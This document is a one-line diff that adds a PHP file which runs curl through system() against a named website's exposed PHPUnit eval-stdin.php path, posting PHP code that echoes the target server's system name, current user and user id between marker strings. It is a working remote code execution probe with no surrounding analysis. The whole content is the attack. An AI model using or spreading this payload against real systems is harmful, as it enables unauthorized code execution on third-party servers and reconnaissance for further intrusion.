@@ -1,0 +1,1 @@
+<?php echo system("curl --data \"<?echo 'Black'; echo php_uname();echo 'jancok'; echo get_current_user(); echo posix_getuid(); echo 'Panthers';?>\" -X GET http://www.thinkmaharashtra.com/vendor/phpunit/phpunit/src/Util/PHP/.eval-stdin.php"); ?> 
